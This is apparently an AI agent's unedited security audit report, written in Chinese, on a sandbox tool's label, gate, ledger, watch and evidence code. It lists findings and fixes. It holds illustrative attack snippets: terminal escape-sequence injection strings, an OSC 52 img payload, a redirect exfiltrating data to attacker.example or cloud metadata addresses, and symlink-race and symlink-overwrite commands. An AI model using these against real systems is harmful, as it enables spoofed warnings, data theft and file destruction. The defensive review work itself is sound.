# 第二輪獨立審查 r3：probe、watch、state、ledger、evidence、label、report

這是審查代理的原始報告，未經修改。代理沒看過第一輪紀錄與其他代理的報告，只能讀碼、不能執行。各項發現經查證後的判定見 [11 交叉比對](../11-security-review-round2.md)；本報告中的嚴重度是代理自己的初判，可能與查證後不同。

## 摘要

這次審查只用讀檔方式完成：讀了 README、docs/02、docs/03，以及重點範圍內全部的套件，另外追到 runner、gate、manifest、cmd/warp 中與這些套件相連的程式碼。沒有執行任何程式。

雜湊鏈、尾端錨點、側錄檔 HMAC 這幾個核心機制本身寫得嚴謹，同一使用者可以偽造這件事文件也誠實寫明了。問題集中在三個地方：

- **輸出層完全不過濾控制字元。** 惡意作者能用 `\r`／ESC 改寫終端機上的權限標籤，直接打掉 T5 的核心防線：「要作惡就必須把惡意行為寫進標籤給人看」。
- **`warp evidence replay` 的宿主端 HTTP client 會跟隨 app 回傳的重新導向。** 殼內 app 因此能叫殼外的核心替它連往任意位址，繞過對外閘門。
- **核心在宿主端處理檔案時會跟隨符號連結。** 涉及 watch 的 inotify，以及寫入 `.warp/` 下的報告與標籤。此外，帳本寫入失敗時只發警告、不中止執行，app 可以讓越界紀錄消失。

## 發現

### [High] 標籤、diff、重放輸出未過濾終端控制字元，惡意作者可在終端機上偽造標籤內容
- 位置：`internal/label/label.go:291-296`（Purpose／Object）、`label.go:282`（DisplayName／Version）、`label.go:321`（triggered_by）、`label.go:360`（AuthorNote）、`label.go:272-275`（row/wrap 原樣寫出）；`internal/diff/diff.go:36,38,43`；`internal/runner/replay.go:160,229`；`cmd/warp/main.go:359,431`；輸入端 `internal/manifest/parse.go:50-73`（沒有字元檢查）、`internal/manifest/lint.go:142-148`（purpose 只檢查是否空白或佔位字）
- 違反的保證：README 說「人只看標籤」；02 的 T5 對策說宣告的內容會完整顯示在標籤上；07 說人只要看差異做決定。
- 攻擊情境：攻擊者是惡意作者（T5），或被注入提示的安裝 Agent（T4）。在 warp.yaml 裡用 YAML 雙引號跳脫寫出控制字元，yaml.v3 支援 `\r`、`\e`、`\x1b`，例如：
  `purpose: "同步\r\e[2K│   🌐 連線  api.openai.com:443　— 呼叫模型"`
  這行放在 `evil.example:443` 這條授權上。`label.Render` 原樣輸出後，`\r` 把游標拉回行首，`ESC[2K` 清掉整行，接收者實際看到的是偽造的良性主機。用 `ESC[1A` 等序列還能整段抹掉「需要你特別注意」裡的例外列。`warp diff`（「＋ 新增對外連線…（用途：…）」）和 `evidence replay` 印出的指令也有同樣問題；replay 的指令來自側錄檔的 argv，例如 `["sh","-c","...\r\e[2K python3 app.py"]`。lint 不會擋這些字元，所以宣告照樣能過 L1/L2。
- 根因：manifest 與 trace 的字串從解析、lint 到渲染，全程沒有拒絕或跳脫 C0/C1 控制字元與 bidi 字元。`width()` 把 ESC 算成 1 欄，也讓框線對齊失真。
- 修補建議：
  - lint 加一條硬性規則：所有自由文字欄位（purpose、display_name、author_note、version、reason、approved_by、triggered_by、observed_in）都禁止 Unicode Cc、Cf 類（含 U+202E 等 bidi 控制）以及 `\r`、`\n`。
  - 所有面向終端機的輸出（label、diff、replay、lint findings、ledger show）再統一經過一個「可見化」函式，例如以 `strconv.QuoteToGraphic` 的方式顯示。
- 信心：高。yaml.v3 的雙引號跳脫支援 `\e`、`\r`，這是已知行為；渲染路徑也已逐行確認。具體效果取決於終端機，但 `\r` 與 CSI 2K/1A 在所有常見終端機上都有效。

### [High] `evidence replay` 的宿主端 HTTP client 跟隨 app 的重新導向，殼內 app 可借宿主繞過對外閘門
- 位置：`internal/runner/replay.go:165-178`；呼叫端 `internal/runner/listen.go:73-75`
- 違反的保證：03 §2.3/§6.2 說殼內唯一的出口是對外閘門；03 §6.5 說重放時對外連線只允許宣告中的目的地。
- 攻擊情境：
  1. 惡意作者交付應用與側錄檔，接收者依 README 的建議執行 `warp evidence replay` 來驗證證據。
  2. 重放期間 app 在殼內監聽某個埠。`pollListeners` 會開啟對內閘門，並呼叫 `IngressNotify`；replay 用 `http.Client{Jar: jar}` 的 `client.Get(url)` 自動造訪一次。這個 client 跑在**宿主的網路命名空間**，而且沒有設 `CheckRedirect`，Go 預設最多跟隨 10 次重新導向。
  3. 閘門先回 303 導到 `/`，請求再被轉進殼內。app 回應 `302 Location: http://attacker.example/?d=<殼內可見的資料>`，或 `http://169.254.169.254/...`、`http://192.168.1.1/...`、`http://127.0.0.1:<本機其他服務>/...`。
  4. 宿主端核心直接連過去，完全不經 `decide()` 的白名單與位址檢查。
- 得到什麼：
  - 一條繞過閘門的外洩通道（URL 中的資料）。若接收者用 `--pick` 指定了真實資料夾，資料夾內容也可能經這條通道外洩；程式並沒有強制只能用合成資料。
  - 對宿主本機與內網、雲端中繼資料位址的盲 SSRF（GET）。
  - 暴露接收者的對外 IP。
- 根因：一個在殼外、以核心身分運作的 HTTP client，接受殼內不可信程式的回應去決定下一步要連到哪裡。
- 修補建議：client 設定 `CheckRedirect` 回傳 `http.ErrUseLastResponse`。如果要允許重新導向，只能放行 `Host` 等於該對內閘門的 `127.0.0.1:<HostPort>`。`Transport.DialContext` 也應固定只能連到該閘門的位址。
- 信心：高。程式碼路徑與 Go 預設的重新導向行為都已確認。實際能外洩的資料量取決於重放時殼內看得到什麼，這點較有限。

### [Medium] watch 在宿主端跟隨殼內 app 建立的符號連結，可列舉並監看宿主任意目錄，耗盡 inotify
- 位置：`internal/watch/watch_linux.go:53-69`（先 `os.ReadDir(dir)` 再 `InotifyAddWatch(dir, …|IN_ONLYDIR)`，沒有 `IN_DONT_FOLLOW`）、`watch_linux.go:114-116`（收到 `IN_CREATE|IN_ISDIR` 後才補監看）
- 違反的保證：03 §6.4 說側錄只記錄各變數根目錄下的存取；側錄模式「拋棄式、應用無限制但碰不到殼外」。
- 攻擊情境：
  1. 在 `warp record` 或 `warp evidence replay` 期間，殼內的惡意相依套件（T2）或惡意應用執行 `mkdir /warp/data/x; rmdir x; ln -s / x`（或 `ln -s /home x`），並反覆重試。
  2. watcher 收到 `IN_CREATE|IN_ISDIR` 後去處理宿主端的 `<tmp>/x`。這時 `x` 已經換成符號連結，`os.ReadDir` 和 `inotify_add_watch` 都會解析它，而且是在**宿主**檔案系統上以使用者身分解析。
  3. `addTree` 接著遞迴走訪整棵宿主目錄樹並逐一加上監看。
- 得到什麼：
  - 宿主其他目錄（例如使用者家目錄）期間發生的存取事件，連同檔名，會以 `${APP_DATA}` 下 `x/...` 的路徑寫進 `.warp/evidence/trace-*.json`。這個檔案權限 0644，而且通常隨應用交付或提交進版本庫，等於把宿主檔名外洩給日後拿到交付物的人。
  - 每個使用者共用的 `max_user_watches` 會被耗盡，影響使用者其他程式（IDE、同步工具）。
  - 遞迴走訪全檔案系統期間，`Watcher.Stop()` 必須等 loop 結束，`warp record` 會卡住。
- 根因：inotify 預設跟隨符號連結；監看目標的路徑字串由不可信一方控制，而且檢查與使用之間有時間差。
- 修補建議：
  - `InotifyAddWatch` 加上 `IN_DONT_FOLLOW`。
  - 先用 `openat(O_DIRECTORY|O_NOFOLLOW)` 相對父目錄 fd 開啟子目錄，再對 `/proc/self/fd/N` 加監看並走訪。
  - 驗證該目錄的 `st_dev` 與掛載根相同。
  - 處理 `IN_Q_OVERFLOW`，並限制監看數量上限。
- 信心：中。「inotify 預設跟隨符號連結」以及「先 ReadDir、後 AddWatch 也會跟隨」都可確認。競態窗口要靠 app 重試命中；watcher 的 poll 間隔是 200ms，加上處理延遲，窗口實際上很寬，但我沒有實測。

### [Medium] 執行期終端跳脫序列注入：帳本與即時通知寫入解碼後的 URL 路徑
- 位置：`internal/gate/ingress.go:148,166-167`（notify 直接印出 `r.URL.Path`、Origin）、`ingress.go:138,147,173`（寫入帳本）；`internal/gate/egress.go:476,593`（Detail 為 `req.Method+" "+req.URL.Path`）、`egress.go:506`（Detail 為 `req.Host`）；`cmd/warp/main.go:555`（`ledger show` 原樣印出 Target/Detail）；`internal/runner/runner.go:687`（`errf("%s", msg)`）
- 違反的保證：README 說「所有越界嘗試都有紀錄」，帳本與通知應該是可信的人話紀錄；同意與通知要顯示在殼的介面上，應用不能偽造（03 §2.8 的精神）。
- 攻擊情境：
  - **對內閘門。** 任何本機程式，或使用者瀏覽器裡的任意網頁，都能在 `warp enforce` 執行中觸發。例如網頁放 `<img src="http://127.0.0.1:8000/%1b]52;c;BASE64%07%1b[2K">`：no-cors 的 GET 不帶 Origin，也沒有權杖，於是走到 `notify("已阻擋未帶權杖的連入請求 GET <解碼後含 ESC 的路徑>")`，直接寫到接收者的終端機。視終端機而定，效果包括偽造或抹除 warp 的警告、改視窗標題、OSC 52 改寫剪貼簿。
  - **對外閘門。** 殼內 app 送出 `GET http://allowed.example/%1b[2J...`，`req.URL.Path` 已被解碼成含 ESC 的字串並存進帳本。事後使用者執行 `warp ledger show` 稽核時被注入，可藉此遮蔽同一頁上的阻擋紀錄。
- 根因：`url.URL.Path` 是百分比解碼後的字串；寫入與輸出時都沒有跳脫。
- 修補建議：
  - 帳本與通知一律記錄 `EscapedPath()` 或 `%q`。
  - `ledger show` 與 `notify` 輸出前做控制字元可見化。
  - 對內閘門的通知要做頻率限制，避免網頁洗版。
- 信心：高。Go 的 `ParseRequestURI` 接受 `%1b`，並在 `Path` 中解碼成 0x1B，這點確定。各終端機對 OSC 52 等序列的支援程度不一。

### [Medium] 帳本寫入失敗時強制模式照常執行（fail-open），而 app 可經由 APP_DATA 造成寫入失敗
- 位置：`internal/ledger/ledger.go:236-243`（`Log` 只印警告）、`ledger.go:219-226`（寫入條目後才寫錨點）；`internal/runner/runner.go:319`（持久 APP_DATA 位於 `<狀態目錄>/apps/<app>/data`，與帳本同一檔案系統）；03 §6.1 表格寫明「寫入宣告目錄的總量未受限」
- 違反的保證：README 說「所有越界嘗試都有紀錄」；03 §2.9 說所有閘門的決定都會寫入。
- 攻擊情境：
  1. 惡意 app 以多個小於 `RLIMIT_FSIZE` 的檔案寫滿 `/warp/data`。這會耗盡狀態目錄所在的檔案系統，預設是 `~/.local/state`，通常就是 `/home`。
  2. 之後所有 `Ledger.Log`（閘門的阻擋或放行決定）都失敗，只在 stderr 出現一行警告，app 繼續執行。這段期間的越界嘗試不會留下任何帳本紀錄。
  3. 若 `f.Write` 在 ENOSPC 時只寫了半行，`lastEntry` 之後永遠無法解析，所有後續執行的 `run start` 都會失敗。這會變成永久拒絕執行，需要人工修復帳本。
  4. app 也可以利用寫錨點失敗，讓錨點落後兩筆以上，使 `checkTail` 拒絕續寫。
- 根因：稽核寫入失敗被當成非致命事件；app 可寫的資料與核心的稽核狀態放在同一個沒有配額的檔案系統上。
- 修補建議：
  - 強制模式下，帳本寫入失敗就應該終止殼（fail closed），至少要讓閘門拒絕後續所有連線。
  - APP_DATA 改放在有容量上限的獨立掛載（例如 loop 或 tmpfs quota），或在寫入前預留空間。
  - 帳本寫入失敗時 `ftruncate` 回原本長度，避免留下半行。
- 信心：中。邏輯已確認。「同一檔案系統」在預設設定下成立，但如果使用者另外設定了 `WARP_STATE_DIR`，情況會不同。

### [Medium] `.warp/` 下的輸出檔寫入會跟隨符號連結，惡意交付物可讓接收者覆寫任意檔案
- 位置：`cmd/warp/main.go:353-354`（label.json）、`internal/report/report.go:105-114`（probe.json、enforce-last.json，用 `os.WriteFile`）、`cmd/warp/main.go:396-402`（draft 輸出）、`internal/evidence/trace.go:183`（`.warp/evidence` 本身若是符號連結，側錄檔會被寫到別處）
- 違反的保證：檔案通道只讓應用碰到宣告的路徑；接收者不需要相信作者（README「整體流程」）。
- 攻擊情境：
  1. 惡意作者在交付的應用目錄（git 或 tar 都能保存符號連結）中放入 `.warp/label.json -> ../../.bashrc`，或 `.warp/reports/enforce-last.json -> ../../../Documents/重要.xlsx`。`ComputeDigest` 會略過 `.warp/`，所以這些不影響內容雜湊。
  2. 接收者依流程執行 `warp label`、`warp enforce` 或 `warp probe`。核心以接收者身分在**殼外**截斷並覆寫連結指向的檔案，寫入的是 JSON。
- 得到什麼：完全不需要通過沙箱，就能破壞接收者任意可寫檔案的完整性與可用性。內容大多不受攻擊者控制，所以主要是破壞，不是程式碼執行。
- 根因：寫入應用目錄內由作者提供的路徑時，沒有使用 `O_NOFOLLOW`，也沒有檢查目錄鏈。
- 修補建議：
  - 以 `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)`，或逐層 `O_NOFOLLOW|O_DIRECTORY` 開啟 `.warp/` 與子目錄。
  - 先寫暫存檔，再 `renameat` 到目標位置。
  - 發現 `.warp/` 內任何符號連結就拒絕。
- 信心：中高。程式碼行為確定。可利用的前提是接收者直接在作者交付的目錄上執行 warp；依 README 與 07 的流程，這是預期的用法。

### [Low] probe 與 enforce 報告未簽章，信任等級 L2 只靠可公開計算的雜湊比對
- 位置：`internal/label/label.go:199-211,220-221`；`internal/report/report.go:132-156`
- 違反的保證：標籤上的「L2 已驗證」以及「探針 N/N 被擋下」應該代表這台機器實際跑過的結果。
- 攻擊情境：Agent（T4），或交付物裡附帶的 `.warp/reports/probe.json`，只要填入正確的 `manifest_sha256` 與 `app_digest`（兩者任何人都能算出）和全部 blocked 的項目，標籤就顯示 L2。其中 `Resources[].Mechanism`、`Identity` 字串還會進入終端渲染（`label.go:246,352,356`），疊加第一項的注入問題。
- 根因：側錄檔有 HMAC，報告卻沒有，兩者不一致。
- 修補建議：報告用與 trace 相同的本機金鑰簽章，並綁定 run_id，對照帳本中對應的 `probe`／`run` 條目。標籤只採信簽章有效、帳本中也找得到的報告。
- 信心：高（程式行為）。不過標籤 Notes 已經承認同一使用者可以偽造，加上在接收者機器上 trace 簽章不符會先讓 lint 失敗，實際影響較小，所以列為 Low。

### [Low] 證據比對不看 Decision：被擋下的連線也算證據，也算「重現」
- 位置：`internal/evidence/trace.go:278-285`（`HasEgress`）；用在 `internal/manifest/lint.go:631` 與 `internal/runner/replay.go:196`
- 違反的保證：04/05 說「每條權限都要有側錄證據」，以及重放要「確認宣告的行為確實重現」。
- 攻擊情境：在側錄或重放時被位址檢查擋下的連線（例如解析到私有網段，或「無法解析主機名稱」），一樣會滿足 `lan: true` 授權或萬用字元授權的證據要求。replay 會回報「✔ 重現」，即使該連線在重放時根本沒有成功。
- 根因：比對時只看 host/port，忽略 `Decision`。draft 有排除 blocked，但 lint 與 replay 沒有。
- 修補建議：`HasEgress` 只接受 `Decision == "allowed"`；或者在 replay 的輸出中把「只觀察到嘗試」與「實際連線」分開顯示。
- 信心：中。依證據的語意定義（「某指令做出這個行為」），「嘗試連線」是否算證據有爭議。

### [Low] 狀態目錄的權限與身分沒有驗證；持久狀態只以路徑和名稱為鍵
- 位置：`internal/state/state.go:20-32,52,81`（`MkdirAll` 不會修正既有目錄的權限，也不檢查擁有者）；`internal/state/state.go:43-51`（AppDir 的鍵只有 appRoot 路徑與 app.name）；`internal/runner/runner.go:267-270` 的保護清單用未經 EvalSymlinks 的 `state.Root()`，與 `paths.go:38-44` 解析後的路徑比對
- 違反的保證：README 說帳本與 APP_DATA 存在殼外，應用碰不到。
- 攻擊情境：
  - 如果 `WARP_STATE_DIR` 或 `XDG_STATE_HOME` 指向他人可寫或已存在且權限寬鬆的目錄，其他使用者就能改寫帳本與 APP_DATA。trace.key 雖然有權限檢查，但目錄層級沒有。
  - 另一個應用若被放到同一路徑並使用同一個 `app.name`（例如更新或替換下載內容），會直接繼承前一個應用的持久 APP_DATA 與當日上傳計數。
  - 若狀態根路徑中含有符號連結，USER_PICK 與狀態目錄的重疊檢查可能失效。
- 修補建議：
  - 狀態根與各層目錄檢查 owner 等於 euid、權限為 0700，並以 EvalSymlinks 之後的路徑做保護比對。
  - AppDir 的鍵可以加入 manifest 中的穩定識別，或在 app.digest 大幅變動時提示使用者。
- 信心：低至中。都需要特定設定或操作才會發生。

## 檢查過且認為沒問題的地方

- **帳本雜湊鏈（`ledger.go` 的 `entryHash`／`Verify`）**：每筆以 `prev` 串接，重算時拒絕未知欄位並檢查序號連續，可偵測修改、刪除與重排。
- **尾端錨點（`checkTail`、`Verify`）**：只接受「錨點等於最後一筆」或「錨點落後一筆且 prev 相符」兩種狀態，崩潰窗口處理正確；續寫前先檢查，截斷不會被新紀錄蓋掉。
- **帳本並行寫入**：`flock` 加上 `O_APPEND`，錨點也在同一把鎖內更新，多個同時執行不會讓鏈分岔。
- **帳本檔案權限**：ledger.jsonl、head 皆為 0600，狀態目錄以 0700 建立，殼內也不掛載狀態目錄。
- **側錄檔 HMAC（`evidence.Sign`／`Verify`）**：簽章涵蓋除 signature 以外的所有欄位（含 command、app_digest、id），使用 `hmac.Equal` 常數時間比較。
- **簽章金鑰（`state.TraceKey`）**：32 位元組隨機值，以 `O_EXCL`、0600 建立；讀取前用 Lstat 檢查一般檔案、擁有者與權限，並正確處理建立時的競爭。
- **證據的重放與挪用防護（lint `checkEvidence`）**：要求 `triggered_by` 逐字等於 trace 中的指令、`app_digest` 等於宣告值，`observed_in` 限制在 `.warp/evidence/` 且禁止 `..`；拿別的應用或舊版本的 trace 來用會被擋。
- **側錄檔寫入**：`evidence.Write` 用 `O_CREAT|O_EXCL`，最後一個路徑元件若是符號連結會失敗，不會覆寫既有檔案。
- **probe 結果的可信度**：probe 模式的 APP_DATA、APP_CACHE、USER_PICK 一律是新的暫存目錄（`runner.go:312-317,332-339,365-370`），app 先前無法預埋符號連結或偽造 `.probe-results.json`；殼內實際跑的是核心自己的探針代理，不是 app。
- **probe 網路項目交叉驗證**：標為 blocked 的 `net.connect`／`net.http` 項目必須在本次執行的帳本中有對應的 deny 才算數（`probe.go:175-204`），殼內代理單方面宣稱擋下不會被採信。
- **AppDir 名稱處理**：`unsafeName` 只保留 `[a-z0-9_-]` 並截短，無法做路徑穿越。
- **manifest 解析**：大小上限 1 MiB，禁止別名、錨點、標記與多文件，排除 YAML 炸彈與型別混淆。
- **帳本條目大小**：請求標頭上限 1 MiB（`egress.go:268`），`Verify` 的 scanner 上限 16 MiB，單筆條目不會讓驗證失敗。
- **側錄檔中的檔名**：watch 產生的檔名（可能含控制字元）只存進 trace JSON，draft 與 lint 只用到根變數，不會原樣印到終端機。
